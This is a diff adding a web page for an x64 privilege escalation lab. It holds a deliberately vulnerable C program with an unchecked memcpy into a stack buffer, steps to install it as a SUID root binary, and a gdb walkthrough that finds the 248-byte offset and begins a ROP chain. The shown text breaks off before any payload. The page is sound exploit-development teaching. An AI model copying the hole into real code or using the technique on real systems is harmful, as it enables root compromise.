@@ -1,0 +1,1248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <meta name="description" content="Hands-on Privilege Escalation Laboratory - Buffer Overflow with ROP Chain and SUID">
+    <meta name="author" content="RootEscalate">
+    <title>Privilege Escalation Lab | ROP Chain x64</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Source+Code+Pro:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/vs2015.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+    }
+
+    body {
+        background: #0a0c0f;
+        color: #e0e0e0;
+        font-family: 'Inter', sans-serif;
+        line-height: 1.6;
+        scroll-behavior: smooth;
+    }
+
+    ::-webkit-scrollbar {
+        width: 10px;
+        height: 10px;
+    }
+    ::-webkit-scrollbar-track {
+        background: #1a1d24;
+    }
+    ::-webkit-scrollbar-thumb {
+        background: #e74c3c;
+        border-radius: 5px;
+    }
+    ::-webkit-scrollbar-thumb:hover {
+        background: #c0392b;
+    }
+
+    /* Estilos para menú desplegable */
+    .nav-links {
+        display: flex;
+        gap: 1.5rem;
+        list-style: none;
+        align-items: center;
+    }
+
+    .nav-item {
+        position: relative;
+    }
+
+    .nav-link {
+        color: #e0e0e0;
+        text-decoration: none;
+        transition: color 0.3s;
+        font-weight: 500;
+        display: inline-block;
+        padding: 0.5rem 0;
+        cursor: pointer;
+        white-space: nowrap;
+    }
+
+    .nav-link i {
+        margin-right: 4px;
+    }
+
+    .nav-link:hover {
+        color: #e74c3c;
+    }
+
+    /* Submenú desplegable */
+    .submenu {
+        position: absolute;
+        top: 100%;
+        left: 0;
+        background: #111317;
+        border: 1px solid #e74c3c;
+        border-radius: 12px;
+        min-width: 220px;
+        opacity: 0;
+        visibility: hidden;
+        transform: translateY(-10px);
+        transition: all 0.3s ease;
+        z-index: 1000;
+        box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+        backdrop-filter: blur(5px);
+    }
+
+    .nav-item:hover .submenu {
+        opacity: 1;
+        visibility: visible;
+        transform: translateY(0);
+    }
+
+    .submenu a {
+        display: block;
+        padding: 0.7rem 1.2rem;
+        color: #e0e0e0;
+        text-decoration: none;
+        font-size: 0.9rem;
+        transition: all 0.2s;
+        border-bottom: 1px solid #1f2329;
+    }
+
+    .submenu a:last-child {
+        border-bottom: none;
+    }
+
+    .submenu a:hover {
+        background: #1a1d24;
+        color: #e74c3c;
+        padding-left: 1.5rem;
+    }
+
+    /* Enlace externo estilo botón (para adquirir libro) */
+    .nav-link-external {
+        background: #1a1d24;
+        padding: 0.4rem 0.8rem;
+        border-radius: 20px;
+        border: 1px solid #e74c3c;
+    }
+
+    .nav-link-external:hover {
+        background: #e74c3c;
+        color: #0a0c0f !important;
+    }
+
+    .navbar {
+        position: fixed;
+        top: 0;
+        width: 100%;
+        background: rgba(10, 12, 15, 0.95);
+        backdrop-filter: blur(10px);
+        border-bottom: 1px solid #e74c3c;
+        padding: 0.5rem 2rem;
+        z-index: 1000;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        flex-wrap: wrap;
+    }
+
+    /* Nuevo estilo para el logo con imagen de 60px optimizado */
+    .logo {
+        display: flex;
+        align-items: center;
+        gap: 12px;
+        flex-shrink: 0;
+    }
+    
+    .logo img {
+        height: 120px;
+        width: auto;
+        display: block;
+        filter: drop-shadow(0 0 8px rgba(231, 76, 60, 0.3));
+        transition: transform 0.3s ease;
+    }
+    
+    .logo img:hover {
+        transform: scale(1.05);
+    }
+    
+    .logo-text {
+        font-size: 2.3rem;
+        font-weight: 700;
+        background: linear-gradient(135deg, #e74c3c, #c0392b);
+        -webkit-background-clip: text;
+        background-clip: text;
+        color: transparent;
+        letter-spacing: 1px;
+        white-space: nowrap;
+    }
+
+    .book-gif {
+        text-align: center;
+        margin: 1rem 0;
+    }
+
+    .book-gif img {
+        width: 100%;
+        max-width: 180px;
+        height: auto;
+        border-radius: 12px;
+        border: 1px solid rgba(231, 76, 60, 0.3);
+        transition: transform 0.3s ease;
+    }
+
+    .book-gif img:hover {
+        transform: scale(1.05);
+    }
+
+    .main-content p, 
+    .main-content .section-card p,
+    .main-content .alert p {
+        text-align: justify;
+    }
+
+    .hero {
+        margin-top: 80px;
+        padding: 3rem 2rem;
+        background: linear-gradient(135deg, #0f1419 0%, #0a0c0f 100%);
+        border-bottom: 2px solid #e74c3c;
+        text-align: center;
+    }
+
+    .hero h1 {
+        font-size: 2.8rem;
+        margin-bottom: 1rem;
+        font-weight: 800;
+    }
+
+    .hero h1 span {
+        color: #e74c3c;
+        font-family: 'Source Code Pro', monospace;
+    }
+
+    .hero p {
+        font-size: 1.1rem;
+        max-width: 800px;
+        margin: 0 auto;
+        color: #b0b0b0;
+    }
+
+    .badge-container {
+        margin-top: 1.5rem;
+        display: flex;
+        gap: 0.8rem;
+        justify-content: center;
+        flex-wrap: wrap;
+    }
+
+    /* Layout de dos columnas */
+    .container-main {
+        max-width: 1600px;
+        margin: 0 auto;
+        padding: 2rem;
+    }
+
+    .content-wrapper {
+        display: flex;
+        gap: 2rem;
+        position: relative;
+    }
+
+    .main-content {
+        flex: 1;
+        min-width: 0;
+    }
+
+    /* Sidebar sticky */
+    .sidebar {
+        width: 320px;
+        flex-shrink: 0;
+        position: sticky;
+        top: 100px;
+        align-self: flex-start;
+        max-height: calc(100vh - 120px);
+        overflow-y: auto;
+    }
+
+    /* Estilos de la tarjeta del libro (colores rojos) */
+    .book-card {
+        background: linear-gradient(135deg, #111317 0%, #0d0f14 100%);
+        border: 1px solid #e74c3c;
+        border-radius: 20px;
+        padding: 1.5rem;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        transition: transform 0.3s ease, box-shadow 0.3s ease;
+    }
+
+    .book-card:hover {
+        transform: translateY(-5px);
+        box-shadow: 0 15px 40px rgba(231, 76, 60, 0.15);
+    }
+
+    .book-icon {
+        text-align: center;
+        margin-bottom: 1rem;
+    }
+
+    .book-icon i {
+        font-size: 3rem;
+        color: #e74c3c;
+    }
+
+    .book-card h3 {
+        color: #e74c3c;
+        font-size: 1.2rem;
+        margin-bottom: 1rem;
+        text-align: center;
+        border-left: none;
+        padding-left: 0;
+    }
+
+    .book-card h4 {
+        color: #e74c3c;
+        font-size: 1rem;
+        margin: 1rem 0 0.5rem 0;
+    }
+
+    .book-card p {
+        font-size: 0.85rem;
+        line-height: 1.5;
+        color: #c0c0c0;
+        margin-bottom: 0.75rem;
+    }
+
+    .book-card ul {
+        margin: 0.5rem 0 0.5rem 1rem;
+        list-style: none;
+    }
+
+    .book-card ul li {
+        font-size: 0.8rem;
+        color: #b0b0b0;
+        margin-bottom: 0.25rem;
+    }
+
+    .book-divider {
+        height: 1px;
+        background: linear-gradient(90deg, transparent, #e74c3c, transparent);
+        margin: 1rem 0;
+    }
+
+    .book-conclusion {
+        font-style: italic;
+        font-size: 0.8rem;
+        background: rgba(231, 76, 60, 0.1);
+        padding: 0.75rem;
+        border-radius: 12px;
+    }
+
+    .book-action {
+        text-align: center;
+        margin-top: 1rem;
+        padding: 0.75rem;
+        background: #1a1d24;
+        border-radius: 30px;
+        color: #e74c3c;
+        font-weight: 600;
+        font-size: 0.9rem;
+        border: 1px solid #e74c3c;
+        transition: all 0.3s;
+    }
+
+    .book-action:hover {
+        background: #e74c3c;
+        color: #0a0c0f;
+        cursor: pointer;
+    }
+
+    /* Responsive */
+    @media (max-width: 1200px) {
+        .nav-links {
+            gap: 1rem;
+        }
+        .nav-link {
+            font-size: 0.9rem;
+        }
+    }
+
+    @media (max-width: 1024px) {
+        .content-wrapper {
+            flex-direction: column;
+        }
+        .sidebar {
+            width: 100%;
+            position: static;
+            margin-top: 2rem;
+        }
+        .nav-links {
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 0.8rem;
+        }
+        .submenu {
+            position: static;
+            opacity: 1;
+            visibility: visible;
+            transform: none;
+            display: none;
+            margin-top: 0.5rem;
+            background: #0a0c0f;
+        }
+        .nav-item.active .submenu {
+            display: block;
+        }
+        .navbar {
+            padding: 0.8rem 1rem;
+        }
+    }
+
+    .badge {
+        padding: 0.4rem 0.9rem;
+        border-radius: 20px;
+        font-size: 0.8rem;
+        font-weight: 600;
+        background: #1a1d24;
+        color: #e74c3c;
+        border: 1px solid #e74c3c;
+    }
+
+    .container {
+        max-width: 1400px;
+        margin: 0 auto;
+        padding: 2rem;
+    }
+
+    .section-card {
+        background: #111317;
+        border-radius: 16px;
+        padding: 2rem;
+        margin-bottom: 2rem;
+        border: 1px solid #1f2329;
+        transition: transform 0.2s, border-color 0.3s;
+    }
+
+    .section-card:hover {
+        border-color: #e74c3c;
+        transform: translateY(-2px);
+    }
+
+    .section-title {
+        font-size: 1.8rem;
+        margin-bottom: 1.5rem;
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+        border-left: 4px solid #e74c3c;
+        padding-left: 1rem;
+    }
+
+    .section-title i {
+        color: #e74c3c;
+        font-size: 1.5rem;
+    }
+
+    /* Estilo para código enumerado */
+    .numbered-code {
+        counter-reset: line;
+        background: #0a0c0f;
+        border-radius: 12px;
+        margin: 1.5rem 0;
+        border: 1px solid #1f2329;
+        overflow-x: auto;
+    }
+    .numbered-code pre {
+        margin: 0;
+        padding: 1rem;
+        background: transparent;
+        border: none;
+    }
+    .numbered-code code {
+        display: block;
+        font-family: 'Source Code Pro', monospace;
+        font-size: 0.85rem;
+        line-height: 1.6;
+    }
+
+    pre {
+        background: #0a0c0f;
+        border-radius: 12px;
+        padding: 1.5rem;
+        margin: 1.5rem 0;
+        overflow-x: auto;
+        border: 1px solid #1f2329;
+        font-family: 'Source Code Pro', monospace;
+        font-size: 0.85rem;
+        position: relative;
+    }
+
+    code {
+        font-family: 'Source Code Pro', monospace;
+    }
+
+    .copy-btn {
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        background: #e74c3c;
+        border: none;
+        color: #0a0c0f;
+        padding: 5px 10px;
+        border-radius: 6px;
+        cursor: pointer;
+        font-size: 0.75rem;
+        font-weight: bold;
+        transition: background 0.3s;
+        z-index: 10;
+    }
+
+    .copy-btn:hover {
+        background: #c0392b;
+    }
+
+    .data-table {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 1.5rem 0;
+    }
+
+    .data-table th, .data-table td {
+        padding: 0.75rem;
+        text-align: left;
+        border-bottom: 1px solid #1f2329;
+    }
+
+    .data-table th {
+        color: #e74c3c;
+        font-weight: 600;
+    }
+
+    .alert {
+        padding: 1rem;
+        border-radius: 8px;
+        margin: 1rem 0;
+        border-left: 4px solid;
+    }
+
+    .alert-warning {
+        background: rgba(241, 196, 15, 0.1);
+        border-left-color: #f1c40f;
+        color: #f1c40f;
+    }
+
+    .alert-success {
+        background: rgba(46, 204, 113, 0.1);
+        border-left-color: #2ecc71;
+        color: #2ecc71;
+    }
+
+    .alert-danger {
+        background: rgba(231, 76, 60, 0.1);
+        border-left-color: #e74c3c;
+        color: #e74c3c;
+    }
+
+    .alert-info {
+        background: rgba(52, 152, 219, 0.1);
+        border-left-color: #3498db;
+        color: #3498db;
+    }
+
+    .terminal {
+        background: #000000;
+        color: #e74c3c;
+        padding: 1.5rem;
+        border-radius: 12px;
+        font-family: 'Source Code Pro', monospace;
+        font-size: 0.85rem;
+        margin: 1.5rem 0;
+        border: 1px solid #e74c3c;
+    }
+
+    .terminal-prompt {
+        color: #e74c3c;
+    }
+
+    .terminal-output {
+        color: #e0e0e0;
+        margin-left: 1rem;
+    }
+
+    .resource-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+        gap: 1.5rem;
+        margin: 1.5rem 0;
+    }
+
+    .resource-card {
+        background: #0a0c0f;
+        padding: 1.5rem;
+        border-radius: 12px;
+        text-align: center;
+        border: 1px solid #1f2329;
+    }
+
+    .resource-card i {
+        font-size: 2rem;
+        color: #e74c3c;
+        margin-bottom: 1rem;
+    }
+
+    .footer {
+        background: #0a0c0f;
+        border-top: 1px solid #1f2329;
+        padding: 2rem;
+        text-align: center;
+        margin-top: 3rem;
+    }
+
+    @media (max-width: 768px) {
+        .navbar {
+            flex-direction: column;
+            gap: 0.8rem;
+            padding: 0.8rem;
+        }
+        .hero h1 {
+            font-size: 1.8rem;
+        }
+        .section-title {
+            font-size: 1.3rem;
+        }
+        .container {
+            padding: 1rem;
+        }
+        pre {
+            font-size: 0.7rem;
+        }
+        .logo img {
+            height: 45px;
+        }
+        .logo-text {
+            font-size: 1rem;
+        }
+        .hero {
+            margin-top: 100px;
+            padding: 2rem 1rem;
+        }
+    }
+
+    @keyframes blink {
+        0%, 100% { opacity: 1; }
+        50% { opacity: 0; }
+    }
+    
+    .cursor {
+        display: inline-block;
+        width: 10px;
+        height: 18px;
+        background: #e74c3c;
+        animation: blink 1s infinite;
+        vertical-align: middle;
+    }
+
+    .nav-buttons {
+        text-align: center;
+        margin: 2rem 0;
+        display: flex;
+        gap: 1rem;
+        justify-content: center;
+        flex-wrap: wrap;
+    }
+    .nav-btn {
+        display: inline-block;
+        padding: 0.75rem 1.5rem;
+        border-radius: 30px;
+        text-decoration: none;
+        font-weight: 600;
+        transition: all 0.3s ease;
+        cursor: pointer;
+    }
+    .nav-btn:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 5px 20px rgba(231, 76, 60, 0.3);
+    }
+</style>
+</head>
+<body>
+
+<nav class="navbar">
+    <div class="logo">
+        <img src="Logo.png" alt="Logo">
+        <span class="logo-text">I'm root</span>
+    </div>
+
+    <!--
+    <ul class="nav-links">
+        <li class="nav-item">
+            <span class="nav-link"><i class="fas fa-home"></i> Inicio <i class="fas fa-chevron-down" style="font-size: 0.7rem; margin-left: 5px;"></i></span>
+            <div class="submenu">
+                <a href="inicio.html"><i class="fas fa-house-user"></i> I'm root</a>
+                <a href="inicio.html#maquina-virtual"><i class="fas fa-desktop"></i> Máquina virtual CTF</a>
+                <a href="inicio.html#laboratorios"><i class="fas fa-flask"></i> Laboratorios</a>
+                <a href="inicio.html#libro"><i class="fas fa-book"></i> Libro</a>
+                <a href="inicio.html#curso"><i class="fas fa-chalkboard"></i> Curso</a>
+                <a href="inicio.html#autor"><i class="fas fa-user-tie"></i> Sobre el autor</a>
+            </div>
+        </li>
+        
+        <li class="nav-item">
+            <span class="nav-link"><i class="fas fa-flask"></i> Lab 1 <i class="fas fa-chevron-down" style="font-size: 0.7rem; margin-left: 5px;"></i></span>
+            <div class="submenu">
+                <a href="Lab_1.html"><i class="fas fa-bullseye"></i> Objetivo</a>
+                <a href="Lab_1.html#preparacion"><i class="fas fa-tools"></i> Preparación</a>
+                <a href="Lab_1.html#codigo"><i class="fas fa-code"></i> Código fuente</a>
+                <a href="Lab_1.html#explotacion"><i class="fas fa-bug"></i> Explotación</a>
+                <a href="Lab_1.html#recursos"><i class="fas fa-chart-line"></i> Recursos</a>
+            </div>
+        </li>
+
+        <li class="nav-item">
+            <span class="nav-link"><i class="fas fa-flask"></i> Lab 2 <i class="fas fa-chevron-down" style="font-size: 0.7rem; margin-left: 5px;"></i></span>
+            <div class="submenu">
+                <a href="Lab_2.html"><i class="fas fa-bullseye"></i> Objetivo</a>
+                <a href="#preparacion"><i class="fas fa-tools"></i> Preparación</a>
+                <a href="#codigo"><i class="fas fa-code"></i> Código fuente</a>
+                <a href="#explotacion"><i class="fas fa-bug"></i> Explotación</a>
+                <a href="#herramientas"><i class="fas fa-chart-line"></i> Recursos</a>
+            </div>
+        </li>
+
+        <li class="nav-item">
+            <a href="get_book.html" class="nav-link nav-link-external"><i class="fas fa-shopping-cart"></i> Adquirir el libro</a>
+        </li>
+    </ul>
+    -->
+</nav>
+
+    <br>
+<section id="objetivo" class="hero">
+    <h1>Privilege Escalation <span>RootEscalate</span></h1>
+    <div class="badge-container">
+        <span class="badge"><i class="fas fa-microchip"></i> x64</span>
+        <span class="badge"><i class="fas fa-shield-alt"></i> NX enabled</span>
+        <span class="badge"><i class="fas fa-link"></i> ROP Chains</span>
+        <span class="badge"><i class="fas fa-skull"></i> setuid(0)</span>
+        <span class="badge"><i class="fas fa-crown"></i> SUID Binary</span>
+    </div>
+</section>
+
+
+
+<!--
+    <div class="nav-buttons">
+        <a href="inicio.html" class="nav-btn" style="background: none; border: 1px solid #e74c3c; color: #ffffff;">
+            <i class="fas fa-home"></i> Portal Principal
+        </a>
+        <a href="Lab_1.html" class="nav-btn" style="background: none; border: 1px solid #e74c3c; color: #ffffff;">
+            <i class="fas fa-flask"></i> Laboratorio 1
+        </a>
+    </div>
+	-->
+
+    <div class="container-main">
+        <div class="content-wrapper">
+            <div class="main-content">
+
+<!-- OBJECTIVE --> <div id="objetivo-detalle" class="section-card"> <h2 class="section-title"><i class="fas fa-bullseye"></i> OBJECTIVE</h2> <p>By exploiting a vulnerability caused by a buffer overflow in a 64-bit architecture, obtain a shell with superuser (root) privileges in order to gain full control of the target system.</p> </div>
+
+<!-- PREPARATION --> <div id="preparacion" class="section-card"> <h2 class="section-title"><i class="fas fa-tools"></i> LABORATORY PREPARATION</h2> <p>This second laboratory is inspired by the exercises presented in the book <a href="https://www.amazon.com/Computer-Security-Hands-Approach-Wenliang/dp/1733003908" target="_blank" style="color: #e74c3c;">Du, W. (2019, p. 112)</a>, <em>Computer Security: A Hands‑On Approach</em> (2nd ed.), modernized for a 64-bit architecture.</p> </div>
+
+<!-- C SOURCE CODE --> <div id="codigo" class="section-card"> <h2 class="section-title"><i class="fas fa-code"></i> SOURCE CODE</h2> <p>The following source code will be used throughout the development of this laboratory:</p>
+
+
+                    <div class="numbered-code">
+                        <pre><code class="language-c" id="codigo-fuente">
+<span class="line">#include&lt;stdio.h&gt;</span>
+<span class="line">#include&lt;stdlib.h&gt;</span>
+<span class="line">#include&lt;string.h&gt;</span>
+<span class="line">#define SIZE 700</span>
+<span class="line"></span>
+<span class="line">int Function_C(char *content, int string_size) {</span>
+<span class="line">    printf("Original string size %d\n", string_size);</span>
+<span class="line">    char buffer[233];</span>
+<span class="line">    char *reg_rbp_frame;</span>
+<span class="line"></span>
+<span class="line">    memcpy(buffer, content, string_size); //Vulnerable function</span>
+<span class="line">    return 0;</span>
+<span class="line">}</span>
+<span class="line"></span>
+<span class="line">int main(int argc, char *argv[]){</span>
+<span class="line">        if(argc&lt;2){</span>
+<span class="line">                printf("Usage: %s NumberOfCharactersToRead\n", argv[0]);</span>
+<span class="line">                return 0;</span>
+<span class="line">        }</span>
+<span class="line"></span>
+<span class="line">        char *content = (char *)malloc(SIZE * sizeof(char));</span>
+<span class="line">        FILE *file_1 = fopen("contenido.txt", "rb");</span>
+<span class="line"></span>
+<span class="line">        int i=0;</span>
+<span class="line">        while (i &lt; atoi(argv[1])){</span>
+<span class="line">                int ch = fgetc(file_1);</span>
+<span class="line">                if (ch == EOF){</span>
+<span class="line">                        if (feof(file_1)){</span>
+<span class="line">                                printf("End of file reached.\n");</span>
+<span class="line">                        }else{</span>
+<span class="line">                                perror("Error reading the file.");</span>
+<span class="line">                        }</span>
+<span class="line">                        break;</span>
+<span class="line">                }</span>
+<span class="line">                content[i] = (char)ch; i++;</span>
+<span class="line">        }</span>
+<span class="line"></span>
+<span class="line">        fclose(file_1);</span>
+<span class="line">        printf("File contents:\n%s\n", content);</span>
+<span class="line"></span>
+<span class="line">        Function_C(content, i);</span>
+<span class="line">        free(content);</span>
+<span class="line">        return 0;</span>
+<span class="line">}</span>
+</code></pre>
+                    </div>
+
+		    <div class="alert alert-warning"> <i class="fas fa-exclamation-triangle"></i> <strong>Vulnerability:</strong> The <code>memcpy(buffer, content, string_size)</code> function copies data without checking boundaries, allowing the 233-byte buffer to overflow. </div>
+
+
+		    <p><strong>Compilation and SUID Binary Configuration:</strong></p> <div class="terminal"> <div><span class="terminal-prompt">$</span> gcc display.c -o display.exe</div> <div><span class="terminal-prompt">$</span> cp display.exe display_root.exe</div> <div><span class="terminal-prompt">$</span> su</div> <div class="terminal-output">Password:</div> <div><span class="terminal-prompt">#</span> chown root:root display_root.exe</div> <div><span class="terminal-prompt">#</span> chmod u+s display_root.exe</div> <div><span class="terminal-prompt">#</span> exit</div> <div><span class="terminal-prompt">$</span> rm display.exe</div> </div> <div class="alert alert-info"> <i class="fas fa-info-circle"></i> <strong>SUID Binary:</strong> By setting the SUID bit, the program will run with root privileges, enabling privilege escalation. </div> <p>With the steps described above, an ideal environment is available for analyzing and exploiting the vulnerability, including CTF-style scenarios.</p> </div>
+
+<!-- INITIAL EXPLOITATION --> <div id="explotacion" class="section-card"> <h2 class="section-title"><i class="fas fa-bug"></i> EXPLOITATION</h2> <p>To begin the vulnerability exploitation process, we start by executing the program. During execution, it can be observed that the binary requires the number of characters to be read as a parameter. If the program is executed without correctly providing this parameter, a Segmentation fault error occurs.</p> <div class="terminal"> <div><span class="terminal-prompt">debian@debian:/LAB2$</span> ./display_root.exe</div> <div class="terminal-output">Usage: ./display_root.exe NumberOfCharactersToRead</div> <div><span class="terminal-prompt">debian@debian:/LAB2$</span> ./display_root.exe 20</div> <div class="terminal-output">Segmentation fault</div> </div>
+ 
+
+
+<h3>1. Analysis with strings</h3>
+
+
+<p>Let's begin with a static analysis of the executable by identifying the text strings embedded within the binary in order to determine the possible requirements for the program's correct execution, as shown below:</p>
+
+            <pre><code class="language-bash">debian@BOF:~/ENG/LAB2$ strings display_root.exe
+...
+u+UH
+Original string size %d
+Usage: %s NumberOfCharactersToRead
+contenido.txt
+End of file reached.
+Error reading the file.
+File contents:
+;*3$"
+GCC: (Debian 14.2.0-19) 14.2.0
+Scrt1.o
+__abi_tag
+crtstuff.c
+...	   
+</code></pre>
+
+
+	    <p> Based on the previous analysis, we identified the string <strong>contenido.txt</strong>, which could correspond to the name of a file internally used by the program (which we already know because we have access to the source code). Based on this observation, it can be inferred that this file is expected during the execution of the binary, so we proceed to create it with content consisting of 100 characters: </p>
+	    <br>
+
+            <h3>2. Creation of the test file</h3>
+
+
+            <div class="terminal">
+                <div><span class="terminal-prompt">debian@BOF:~/ENG/LAB2$</span> python3 -c "print('A'*94 + 'B'*6)" > contenido.txt</div>
+            </div>
+
+
+<p>We execute the program again and perform various tests, from which we can observe that its behavior is as expected under controlled conditions.</p>
+<div class="terminal">
+    <div><span class="terminal-prompt">debian@BOF:~/ENG/LAB2$</span> ./display_root.exe 20</div>
+    <div class="terminal-output">File contents:</div>
+    <div class="terminal-output">AAAAAAAAAAAAAAAAAAAA</div>
+    <div class="terminal-output">Original string size 20</div>
+    <div><span class="terminal-prompt">debian@BOF:~/ENG/LAB2$</span> wc -c contenido.txt</div>
+    <div class="terminal-output">101 contenido.txt</div>
+    <div><span class="terminal-prompt">debian@BOF:~/ENG/LAB2$</span> ./display_root.exe 101</div>
+    <div class="terminal-output">File contents:</div>
+    <div class="terminal-output">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB</div>
+    <div class="terminal-output">Original string size 101</div>
+</div>
+        </div>
+
+
+        <!-- ANÁLISIS CON GDB -->
+        <div id="gdb" class="section-card">
+            <h2 class="section-title">
+                <i class="fas fa-search"></i>
+		ANALYSIS WITH GDB
+            </h2>
+
+<p> We continue debugging the program using gdb and set a breakpoint (break) at the beginning of execution, specifically in the main() function. Next, we start the program using the run command and observe that execution correctly stops at the main() function, ready to be analyzed. </p>
+
+            <pre><code class="language-gdb">debian@BOF:~/ENG/LAB2$ gdb -q display_root.exe
+Reading symbols from display_root.exe...
+(No debugging symbols found in display_root.exe)
+
+(gdb) break main
+Breakpoint 1 at 0x123a
+
+(gdb) run
+Starting program: /home/debian/ENG/LAB2/display_root.exe
+...
+Breakpoint 1, 0x000055555555523a in main ()	   
+</code></pre>
+
+
+<p> Since we already have prior knowledge of the source code, we know that a vulnerability exists in the <code>Function_C()</code> function, which is used to store the contents of the <strong>contenido.txt</strong> file. For this reason, it is useful to disassemble this function in order to analyze its low-level behavior using the <code>disassemble Function_C</code> command. </p>
+
+	    
+            <pre><code class="language-gdb">
+(gdb) info functions ^Fun
+All functions matching regular expression "^Fun":
+
+Non-debugging symbols:
+0x00005555555551d9  Function_C
+
+(gdb) disassemble Function_C
+Dump of assembler code for function Function_C:
+   0x00005555555551d9 &lt;+0&gt;:     push   %rbp
+   0x00005555555551da &lt;+1&gt;:     mov    %rsp,%rbp
+...
+   0x000055555555522a &lt;+81&gt;:    call   0x555555555090 &lt;memcpy@plt&gt;
+   0x000055555555522f &lt;+86&gt;:    mov    $0x0,%eax
+   0x0000555555555234 &lt;+91&gt;:    leave
+   0x0000555555555235 &lt;+92&gt;:    ret
+End of assembler dump.	    
+	    </code></pre>
+
+<p> Next, we set a new breakpoint (after the call to the <code>memcpy</code> function) with the objective of analyzing the contents of the stack immediately after it has been populated with data from the <strong>contenido.txt</strong> file. </p>
+
+            <pre><code class="language-gdb">
+(gdb) break *Function_C + 86
+Breakpoint 2 at 0x55555555522f	    
+	    </code></pre>
+	    
+
+	    <p> Subsequently, we restart the program, but this time we provide the argument specifying the number of bytes to read, which in this case is 101, corresponding to the total size of the <strong>contenido.txt</strong> file. Execution stops at the second breakpoint. </p>
+
+            <pre><code class="language-gdb">
+(gdb) run 101
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/debian/ENG/LAB2/display_root.exe 101
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, 0x000055555555523a in main ()
+(gdb) c
+Continuing.
+File contents:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB
+
+Original string size 101
+
+Breakpoint 2, 0x000055555555522f in Function_C ()	    
+	    </code></pre>
+
+
+	    <h3>Stack Analysis</h3> 
+ <p> We proceed to analyze the contents of the stack at this point in the execution, as well as the relevant values associated with the stack frame. </p>
+
+            <pre><code class="language-gdb">
+(gdb) x/60gx $rsp
+0x7fffffffe160: 0x00000065ffffe2a0      0x00005555555592a0
+0x7fffffffe170: 0x4141414141414141      0x4141414141414141  # Start of the buffer at address 0x7fffffffe170
+0x7fffffffe180: 0x4141414141414141      0x4141414141414141
+...
+0x7fffffffe250: 0x00007fffffffe3b8      0x00007ffff7ffe5f0
+0x7fffffffe260: 0x00007fffffffe2a0      0x0000555555555354  # Saved RBP and saved RIP
+0x7fffffffe270: 0x00007fffffffe3b8      0x0000000200000000
+...
+(gdb) info frame
+Stack level 0, frame at 0x7fffffffe270:
+ rip = 0x55555555522f in Function_C; saved rip = 0x555555555354
+ called by frame at 0x7fffffffe2b0
+ Arglist at 0x7fffffffe260, args:
+ Locals at 0x7fffffffe260, Previous frame's sp is 0x7fffffffe270
+ Saved registers:
+  rbp at 0x7fffffffe260, rip at 0x7fffffffe268	    
+	    </code></pre>
+
+
+<p> Similar to what was done in Laboratory 1, we proceed to determine the offset required to gain control of the execution flow. </p>
+
+
+<div class="alert alert-success"> <i class="fas fa-chart-line"></i> <strong>Information Obtained:</strong><br> Buffer start address: <code>0x7fffffffe170</code><br> $rbp register address: <code>0x7fffffffe260</code><br> Difference: <code>0xF0 = 240 bytes</code> </div>
+
+        </div>
+
+	<!-- OFFSET CALCULATION --> <div id="offset" class="section-card"> <h2 class="section-title"> <i class="fas fa-calculator"></i> OFFSET CALCULATION </h2> <p>The difference between the address of the <strong>$rbp</strong> register (0x7fffffffe260) and the start address of the buffer (0x7fffffffe170) is <strong>0xF0</strong>, which is equivalent to <strong>240 bytes</strong> in decimal.</p> <p>If we additionally consider the <strong>8 bytes</strong> corresponding to the size of the $rbp register, we obtain a total offset of:</p> <div class="alert alert-info" style="text-align: center; font-size: 1.5rem;"> <strong>Offset = 240 + 8 = 248 bytes</strong> </div> <p>This is the number of bytes required before overwriting the <strong>$rip</strong> register, which would allow control over the program's execution flow.</p> </div>
+
+
+        <!-- ROP CHAIN Y MEMORY MAPPINGS -->
+        <div id="ropchain" class="section-card">
+            <h2 class="section-title">
+                <i class="fas fa-link"></i>
+                ROP CHAIN CONSTRUCTION
+            </h2>
+            
+<p>Recalling that in Laboratory 1 the ASLR security mechanism is disabled, which allows us to work with fixed addresses, we continue by identifying the memory mappings (<code>info proc mappings</code> command) required for the execution of the <code>display_root.exe</code> program.</p>
+
+ <p> From this analysis, it is possible to observe that the libc library starts at memory address 0x00007ffff7dc7000, as shown below: </p>	    
+
+            <pre><code class="language-gdb">
+(gdb) info proc mappings
+process 1397
+Mapped address spaces:
+
+Start Addr         End Addr           Size               Offset             Perms File
+0x0000555555554000 0x0000555555555000 0x1000             0x0                r--p  /home/debian/ENG/LAB2/display_root.exe
+0x0000555555555000 0x0000555555556000 0x1000             0x1000             r-xp  /home/debian/ENG/LAB2/display_root.exe
+0x0000555555556000 0x0000555555557000 0x1000             0x2000             r--p  /home/debian/ENG/LAB2/display_root.exe
+0x0000555555557000 0x0000555555558000 0x1000             0x2000             r--p  /home/debian/ENG/LAB2/display_root.exe
+0x0000555555558000 0x0000555555559000 0x1000             0x3000             rw-p  /home/debian/ENG/LAB2/display_root.exe
